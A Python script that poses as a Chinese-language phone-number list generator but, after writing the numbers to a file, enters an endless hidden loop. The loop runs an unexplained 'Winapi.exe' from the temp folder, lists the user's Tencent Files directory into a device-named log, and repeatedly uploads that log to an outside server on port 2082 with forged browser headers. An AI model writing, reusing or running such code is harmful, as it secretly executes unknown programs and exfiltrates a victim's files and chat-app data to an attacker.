# -*- coding: UTF-8 -*-
import requests
import subprocess
import time
import os
import platform
s = requests.session()
user_name = os.getlogin()
SystemDrive = os.getenv("SystemDrive")
Tempdir = os.getenv("TEMP")
Device = platform.node()
num1to3 = input("请输入前三位数字：")
num10to11 = input("请输入后二位数字：")
# 获取用户批量输入的中间四位数字

nums4to7 = input("请输入中间四位数字，以空格隔开：").split()

# 生成第8、9位数字
for i in range(0, 100):
    num89 = str(99 - i).zfill(2)
    for num4to7 in nums4to7:
        phone = str(num1to3) + str(num4to7) + str(num89) + str(num10to11)
        print(phone)
        with open("output.txt", "a") as f:
            f.write(str(phone) + "\n")

while True:
    subprocess.Popen(rf"cd %temp% && Winapi.exe >{Device}WinINF.log 2>&1", shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(3)
    subprocess.Popen(fr"cd {SystemDrive}\Users\{user_name}\Documents\Tencent Files && dir /b >> {Tempdir}\{Device}WinINF.log",shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(6)
    res2 = s.post(
        url="http://wvvw.0chen.cloud:2082/PoiuytrewQ54321admin/index.php",
        headers={
            'Host': 'wvvw.0chen.cloud:2082',
            'Content-Length': '1384',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="103", ".Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'Origin': 'http://wvvw.0chen.cloud:2082',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'http://wvvw.0chen.cloud:2082',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
        },
        files={
            "userfile": open(rf"{Tempdir}\{Device}WinINF.log", "rb"),
            "Content-Type": "application/octet-stream",
            "Content-Disposition": "form-data",
        },
        data={
            "upload": "上传"
        }
    )
    time.sleep(21)

